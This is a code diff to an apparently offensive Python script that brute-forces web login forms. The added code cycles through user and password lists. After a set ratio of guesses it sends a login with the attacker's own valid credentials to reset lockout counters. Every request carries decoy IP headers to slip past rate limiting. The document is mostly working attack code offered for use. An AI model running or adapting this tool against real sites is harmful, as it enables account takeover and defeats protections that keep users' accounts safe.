@@ -23,6 +23,9 @@ parser.add_argument("-d", "--data", help="Data to be sent in the request 'param=
 parser.add_argument("--message", help="Message to be matched in the body", required=False)
 parser.add_argument("-x", "--proxy", help="Example = http://127.0.0.1:8080", required=False)
 parser.add_argument("-b", "--body", help="Show the response body", action="store_const", const=True, required=False)
+parser.add_argument("-au", "--attacker-user", help="Attackers username", required=False)
+parser.add_argument("-ap", "--attacker-password", help="Attackers password", required=False)
+parser.add_argument("-rt", "--ratio", help="Ratio to use the attackers credentials", type=int, required=True)
 
 if len(sys.argv) == 1:
 	parser.print_help()
@@ -76,7 +79,7 @@ def gen_data(data,user=None,password=None):
 	if not user:
 		user = "COMPAH"
 	if not password:
-		password = "TIRA-COCO" * 1000
+		password = "TIRA-COCO" #* 1000
 	if data:
 		try:
 			data = data.split("&")
@@ -166,6 +169,9 @@ def exploit_only_user(url,user,users_file,password,passwords_file,headers,data,m
 			except Exception as e:
 				print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
 
+def exploit(users,passwords):
+	pass
+
 
 ###############################################################################################################################
 ###############################################################################################################################
@@ -174,4 +180,93 @@ def exploit_only_user(url,user,users_file,password,passwords_file,headers,data,m
 
 pwn.log.progress(f"{bcolors.OK}Initiating...{bcolors.RESET}\n\n")
 
-exploit_only_user(args.url,args.user,args.users_file,args.password,args.passwords_file,args.headers,args.data,args.message,args.proxy)
+if args.users_file:
+	with open(args.users_file,"r") as users_file:
+		users = users_file.readlines()
+		request_headers = gen_headers(gen_decoy_ip(),args.headers)
+		request_data = gen_data(args.data)
+		init_response = gen_request(args.url,request_data,request_headers,args.proxy)
+		if args.passwords_file:
+			counter = 0
+			with open(args.passwords_file,"r") as passwords_file:
+				passwords = passwords_file.readlines()
+				for i in range(len(users)):
+					while counter < len(passwords):
+						for j in range(args.ratio):
+							if counter < len(passwords):
+								request_headers = gen_headers(gen_decoy_ip(),args.headers)
+								request_data = gen_data(args.data,users[i].strip(),passwords[counter].strip())
+								try:
+									response = gen_request(args.url,request_data,request_headers,args.proxy)
+									monitor(response,users[i].strip(),init_response,passwords[counter].strip())
+								except Exception as e:
+									print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
+								counter += 1
+						request_headers = gen_headers(gen_decoy_ip(),args.headers)
+						request_data = gen_data(args.data,user=args.attacker_user,password=args.attacker_password)
+						try:
+							response = gen_request(args.url,request_data,request_headers,args.proxy)
+						except Exception as e:
+							print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
+					counter = 0
+		else:
+			counter = 0
+			while counter <  len(users):
+				for i in range(args.ratio):
+					if counter < len(users):
+						request_headers = gen_headers(gen_decoy_ip(),args.headers)
+						request_data = gen_data(args.data,users[counter].strip(),args.password)
+						try:
+							response = gen_request(args.url,request_data,request_headers,args.proxy)
+							monitor(response,users[counter].strip(),init_response,args.password)
+						except Exception as e:
+							print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
+						counter += 1
+				request_headers = gen_headers(gen_decoy_ip(),args.headers)
+				request_data = gen_data(args.data,user=args.attacker_user,password=args.attacker_password)
+				try:
+					response = gen_request(args.url,request_data,request_headers,args.proxy)
+				except Exception as e:
+					print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
+else:
+	request_headers = gen_headers(gen_decoy_ip(),args.headers)
+	request_data = gen_data(args.data)
+	init_response = gen_request(args.url,request_data,request_headers,args.proxy)
+	if args.passwords_file:
+		with open(args.passwords_file,"r") as passwords_file:
+			passwords = passwords_file.readlines()
+			counter = 0
+			while counter < len(passwords):
+				for i in range(args.ratio):
+					if counter < len(passwords):
+						request_headers = gen_headers(gen_decoy_ip(),args.headers)
+						request_data = gen_data(args.data,args.user,passwords[counter].strip())
+						try:
+							response = gen_request(args.url,request_data,request_headers,args.proxy)
+							monitor(response,args.user,init_response,passwords[counter].strip())
+						except Exception as e:
+							print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
+						counter += 1
+				request_headers = gen_headers(gen_decoy_ip(),args.headers)
+				request_data = gen_data(args.data,user=args.attacker_user,password=args.attacker_password)
+				try:
+					response = gen_request(args.url,request_data,request_headers,args.proxy)
+				except Exception as e:
+					print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
+	else:
+		request_headers = gen_headers(gen_decoy_ip(),args.headers)
+		request_data = gen_data(args.data,args.user,args.password)
+		try:
+			response = gen_request(args.url,request_data,request_headers,args.proxy)
+			monitor(response,args.user,init_response,args.password)
+		except Exception as e:
+			print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
+		if args.attacker_user and args.attacker_password:
+			request_headers = gen_headers(gen_decoy_ip(),args.headers)
+			request_data = gen_data(args.data,user=args.attacker_user,password=args.attacker_password)
+			try:
+				response = gen_request(args.url,request_data,request_headers,args.proxy)
+			except Exception as e:
+				print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
+
+#exploit_only_user(args.url,args.user,args.users_file,args.password,args.passwords_file,args.headers,args.data,args.message,args.proxy)
